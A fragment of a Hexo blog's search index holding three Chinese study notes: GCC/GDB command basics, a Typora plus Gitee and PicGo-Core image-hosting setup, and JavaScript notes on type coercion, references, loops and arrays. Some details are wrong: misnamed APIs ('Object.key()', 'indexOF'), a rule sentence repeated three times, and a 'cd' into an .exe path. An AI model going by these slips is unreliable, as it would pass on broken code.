        <content type="html"><![CDATA[<h2 id="gcc">GCC</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -o test test.c</span><br></pre></td></tr></table></figure><p><code>-o</code>自定义目标文件</p><p><code>-Wall</code>自动提示一些出错警告的信息</p><p><code>-L</code> 链接一个库文件，<code>-L.</code>加上的点意义为将本目录文件作为查找库的根目录</p><h2 id="gdb">GDB</h2><p>在GCC编译时需要添加一个参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -ggdb3 -Wall -o test test.c</span><br></pre></td></tr></table></figure><p>如无报错，即可启动GDB：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb test</span><br></pre></td></tr></table></figure><h3 id="gdb指令">GDB指令</h3><p><code>break 10</code>在第十行设置断点。</p><p><code>break test</code>在<code>test</code>函数处设置断点</p><p><code>s / step</code>下一步</p><p><code>c / continue</code>当程序在某一断点处停止后，用该指令可以继续执行，直至遇到断点或者程序结束</p><p><code>u / until</code> 运行程序直到退出循环体</p><p><code>r / run</code>运行</p><p><code>q / quit</code>结束调试</p><p><code>p / print</code>显示某个变量的值</p><p><code>p *array@len</code> 输出数组</p><p><code>enable</code> 恢复失效的断点</p><p><code>disable </code>使断点失效</p><p><code>clear</code> 清除断点</p><p><code>bt / backtrace </code>查看堆栈信息</p><p><code>watch</code>监测某变量或表达式，当发生变化时停止</p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora借助Gitee+PicGo-Core实现云图床</title>
      <link href="/2022/03/06/Typora-Gitee-PicgoCore%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/06/Typora-Gitee-PicgoCore%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="云图床搭建">云图床搭建</h2><p>2022.3.25更新：gitee搭的图床疑似寄了。已经改用阿里云oss。</p><p>这次我们选择的云图床的搭建是基于gitee。gitee服务器位于国内，避免了github被墙的等一系列问题。</p><h3 id="新建仓库">新建仓库</h3><p>（省略gitee账号创建的过程，如果这都不会，建议不要折腾了）我们看到gitee页面右上角那个加号，然后点击新建仓库。</p><p><img src="https://image.icewindy.cn/20220112213354.png" alt="image-20220112213353460"></p><p>然后输入你自己想要的仓库名称，路径会自动生成跟你仓库名称一样的名称，当然你也可以自己自定义路径名称。</p><p>勾选上开源和设置模板、Readme文件，省去后面初始化的步骤，即可创建好你的仓库。</p><p><img src="https://image.icewindy.cn/20220112213557.png" alt="image-20220112213556929"></p><h3 id="密钥生成">密钥生成</h3><p>点击你的头像，进入设置。</p><p><img src="https://image.icewindy.cn/20220112214030.png" alt="image-20220112214029486"></p><p>看到安全设置/私人密钥。</p><p><img src="https://image.icewindy.cn/20220112214120.png" alt="image-20220112214119534"></p><p>点击“生成新令牌”</p><p><img src="https://image.icewindy.cn/20220112214157.png" alt="image-20220112214157037"></p><p><img src="https://image.icewindy.cn/20220112214214.png" alt="image-20220112214213174"></p><p>填上上描述，勾选上“projects”，生成一串密钥。</p><p><strong>注意：该密钥只会显示一次，注意好保存！！！</strong></p><h2 id="picgo-core配置">PicGO-Core配置</h2><p>接下来我们就来配置PicGo-Core，至于为什么使用Core这种命令行版本，而不使用app这种带ui，是因为我不想在后台开多一个软件。</p><h3 id="配置typora">配置Typora</h3><p>点击“文件” “偏好设置” “图像”。</p><p>将“插入图片时候…”修改为“上传图片”，接着将上传服务修改为&quot;PicGO-Core (command line)&quot;，然后点击下载或更新，等他进度条走完。</p><p><img src="https://image.icewindy.cn/20220112214915.png" alt="image-20220112214914458"></p><p>接着点击验证图片上传选项，出现下面窗口。</p><p><img src="https://image.icewindy.cn/20220112215312.png" alt="image-20220112215311393"></p><p>复制前面一长串类似于“ C:\Users\IceWindy\AppData\Roaming\Typora\picgo\win64\picgo.exe”。</p><h3 id="picgo-core插件安装与配置">PicGo-Core插件安装与配置</h3><p>打开你的命令行（cmd)，运行如下命令：<strong>（注意：需要安装Node.js！）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\IceWindy\AppData\Roaming\Typora\picgo\win64\picgo.exe</span><br><span class="line">.\picgo.exe install gitee-uploader</span><br><span class="line">.\picgo.exe install super-prefix </span><br></pre></td></tr></table></figure><p>在Typora图像设置中，点击打开配置文件，我们就打开了一个json格式的文件，按照我下面的样式填写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitee&quot;</span><span class="punctuation">,</span><span class="comment">//当前上传的图床</span></span><br><span class="line">    <span class="attr">&quot;gitee&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icewindy/note-img&quot;</span><span class="punctuation">,</span><span class="comment">//仓库位置</span></span><br><span class="line">      <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;master&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="comment">//我们上文提到的生成的gitee密钥</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;note&quot;</span><span class="punctuation">,</span><span class="comment">//上传到你的仓库的文件夹</span></span><br><span class="line">      <span class="attr">&quot;customPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span><span class="comment">//默认即可</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-super-prefix&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//插件的启用</span></span><br><span class="line">  <span class="attr">&quot;picgo-plugin-super-prefix&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;fileFormat&quot;</span><span class="punctuation">:</span> <span class="string">&quot;YYYYMMDDHHmmss&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="comment">//这段是配置时间戳插件的</span></span><br><span class="line">  <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;lastSync&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-01-12 10:05:31&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>仓库的位置可以打开你仓库的链接，“icewindy/note-img”这地方就是你的仓库位置。</p><p><img src="https://image.icewindy.cn/20220112220530.png" alt="20220112220530"></p><h2 id="验证是否成功">验证是否成功</h2><p>还是打开Typora的图像设置，点击验证图片上传选项，如图即成功。</p><p><img src="https://image.icewindy.cn/20220112222001.png" alt="image-20220112222000592"></p>]]></content>
      
      
      <categories>
          
          <category> 小服务搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记（1）：隐性转换、值与引用、for-in与for-of、数组</title>
      <link href="/2022/01/12/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E9%9A%90%E6%80%A7%E8%BD%AC%E6%8D%A2%E3%80%81%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E3%80%81for-in%E4%B8%8Efor-of%E3%80%81%E6%95%B0%E7%BB%84/"/>
      <url>/2022/01/12/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%EF%BC%9A%E9%9A%90%E6%80%A7%E8%BD%AC%E6%8D%A2%E3%80%81%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E3%80%81for-in%E4%B8%8Efor-of%E3%80%81%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="隐性转换">隐性转换</h2><h3 id="笔记">笔记</h3><ol><li><p><code>NaN != NaN</code></p></li><li><p><code>boolean</code>值在比较时会变为<code>number</code></p></li><li><p><code>string</code>和<code>number</code>比较时会变为<code>number</code></p></li><li><p><code>null == undefined</code>，其余任何值与<code>null</code>/<code>undefined</code>比较都为<code>false</code></p></li><li><p>原始类型与引用类型比较，会调用<code>toPrimitive</code>方法，具体做法就是先<code>valueOf</code>后<code>toString</code></p></li><li><p>我们在对各种非<code>Number</code>类型运用数学运算符(<code>- * /</code>)时，会先将非<code>Number</code>类型转换为<code>Number</code>类型</p></li><li><p>加法特殊：</p><p>当一侧为<code>String</code>类型，被识别为字符串拼接，并会优先将另一侧转换为字符串类型。</p><p>当一侧为<code>String</code>类型，被识别为字符串拼接，并会优先将另一侧转换为字符串类型。</p><p>当一侧为<code>String</code>类型，被识别为字符串拼接，并会优先将另一侧转换为字符串类型。</p><p><strong>该三点由上到下，优先级从高到低</strong></p></li><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#123;&#125; + &#123;&#125;</span><br><span class="line"><span class="title class_">NaN</span></span><br></pre></td></tr></table></figure><p>这个问题的原因是，JavaScript 把第一个 <code>&#123;&#125; </code>解释成了一个空的代码块（code block）并忽略了它。<code>NaN</code>其实是表达式<code>+&#123;&#125;</code>计算的结果 (+ 加号以及第二个 {})。 你在这里看到的 <code>+ </code>加号并不是二元运算符「加法」，而是一个一元运算符，作用是将它后面的操作数转换成数字，和 <code>Number() </code>函数完全一样。</p><ol start="9"><li>转换表：</li></ol><p><img src="https://image.icewindy.cn/20220112212233.png" alt="20220112212233"></p><h3 id="例题">例题</h3><ol><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1, 2, 3&#x27;</span> == [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p><strong>true</strong></p><ol start="2"><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> == <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><strong>false</strong></p><ol start="3"><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span> == [<span class="string">&#x27;1&#x27;</span>]</span><br></pre></td></tr></table></figure><p><strong>true</strong></p><ol start="4"><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span> == <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>false</strong></p><ol start="5"><li></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> == <span class="number">0</span></span><br></pre></td></tr></table></figure><p><strong>true</strong></p><h2 id="值与引用">值与引用</h2><h3 id="类型">类型</h3><ol><li>值类型</li></ol><p>​数字，字符串，布尔，符号，未定义，空</p><ol start="2"><li>引用类型</li></ol><p>​对象，函数，数组</p><h3 id="引用类型">引用类型</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = &#123; <span class="attr">value</span>: <span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> y = x;</span><br><span class="line">x.<span class="property">value</span> = <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p>控制台中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x</span><br><span class="line">&gt;&#123;<span class="attr">value</span>:<span class="number">20</span>&#125;</span><br><span class="line">y</span><br><span class="line">&gt;&#123;<span class="attr">value</span>:<span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure><p>对象不是存储在变量中，而是存储在内存中，变量保存的是对象的内存地址，因此y在复制x的时候，是复制x的内存地址，即x，y都指向同一内存地址，无论通过x还是y去修改这个对象的时候，修改的变化另外一个对象也能看到。</p><h3 id="结论">结论</h3><p>值类型数据复制值</p><p>引用类型数据或对象复制引用（内存地址）</p><h2 id="for-in与for-of">for-in与for-of</h2><h3 id="for-in">for-in</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> object)</span><br></pre></td></tr></table></figure><p>可以循环对象中的每一个成员，可以遍历一个数组，但最好使用<code>for-of</code>。</p><p><code>in</code>可以检查对象中是否包含给定的值</p><h3 id="for-of">for-of</h3><p>从ES6开始，更好遍历数组的方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">of</span> array)</span><br></pre></td></tr></table></figure><p>在<code>for-of</code>中<code>key</code>直接表示为数组内的一个元素。</p><p>该方法仅可用于可枚举的类型（数组和映射）。</p><h3 id="可用于for-of-的object方法">可用于for-of 的Object方法</h3><p><code>Object.key()</code>方法可获得输入对象的所有成员的键，并返回一个数组。</p><p><code>Object.entries()</code>方法可获得输入对象的所有成员的键值对，并返回一个数组。</p><h2 id="克隆一个object的方法">克隆一个Object的方法</h2><ol><li><pre><code class="language-javascript">const newObject = Object.assign(&#123;&#125;, oldObject);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   `&#123;&#125;`内不一定要为空，也可以为一个键值对，相当于是在`newObject`里新增一个键值对，然后再将`oldObject`中的成员克隆过来。</span><br><span class="line"></span><br><span class="line">2. 拆分操作符法</span><br><span class="line"></span><br><span class="line">   ```javascript</span><br><span class="line">   const newObject = &#123; ...oldObject &#125;;</span><br></pre></td></tr></table></figure>最简单的方法，该方法相当于是将使用`...`拆分操作符将`oldObject`内的成员读取并拆解出填入`&#123; &#125;`中。</code></pre></li><li><p>for-in法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> newObject = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> oldObject)</span><br><span class="line">    newObject[key] = oldObject[key];</span><br></pre></td></tr></table></figure><p>最朴素的方法。</p></li></ol><h2 id="javascript部分内置对象">JavaScript部分内置对象</h2><h3 id="math">Math</h3><p><code>Math</code>参考文档</p><p>[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Math</a>]:</p><p><code>Math</code> 是一个内置对象，它拥有一些数学常数属性和数学函数方法。</p><p>注意:<code>Math</code>并不是一个函数对象</p><h3 id="string">String</h3><p>JavaScript中<code>string</code>分为两种，一种是值类型字符串，另外一种是<code>String</code>对象 。但在对值类型的字符串使用点操作符时,JavaScript会自动将值转换为对象，可以像操作对象一样操作它。</p><p><code>String</code>参考文档</p><p>[<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String</a>]:</p><h2 id="数组">数组</h2><h3 id="添加元素">添加元素</h3><h4 id="in-end">In End</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers.<span class="title function_">push</span>(anyThings);</span><br></pre></td></tr></table></figure><p><code>anyThings</code>可填入任意元素（不止一个元素）。</p><h4 id="in-beginning">In Beginning</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers.<span class="title function_">unshift</span>(anyThings);</span><br></pre></td></tr></table></figure><p><code>anyThings</code>可填入任意元素（不止一个元素）。</p><h4 id="in-middle">In Middle</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers.<span class="title function_">splice</span>(startNumber, deleteCount, anyThings);</span><br></pre></td></tr></table></figure><p><code>startNumber</code>元素的位置。注意：数组从0开始计数。</p><p><code>deleteCount</code>想要删除的元素的个数。</p><p><code>anyThings</code>可填入任意元素（不止一个元素）。</p><h3 id="查找元素">查找元素</h3><h4 id="indexof-查找值">indexOF（查找值）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers.<span class="title function_">indexOF</span>(anyThings, startNumber);</span><br></pre></td></tr></table></figure><p>查找<code>numbers</code>内从<code>startNumber</code>开始（可选）是否存在<code>anyThings</code>元素，如果存在则返回所在位置，如果不存在则返回<code>-1</code>。</p><p>注意：该方法是严格对应类型的，字符类型的<code>'1'</code>与数字类型的<code>1</code>是不同的。</p><p>类似的方法<code>lastIndexOF</code>，返回最后一个匹配的元素。</p><p><code>includes</code>方法可以判断是否存在匹配元素，返回<code>true</code> or  <code>false</code></p><p>以上方法均可以加入第二参数<code>startNumber</code>设定开始查找的位置。</p><h2 id="一些实用技巧补充">一些实用技巧补充</h2><ol><li><code>$&#123;&#125;</code>占位符用于一对反引号的模板语句中显示表达式或者变量。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Web三板斧 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
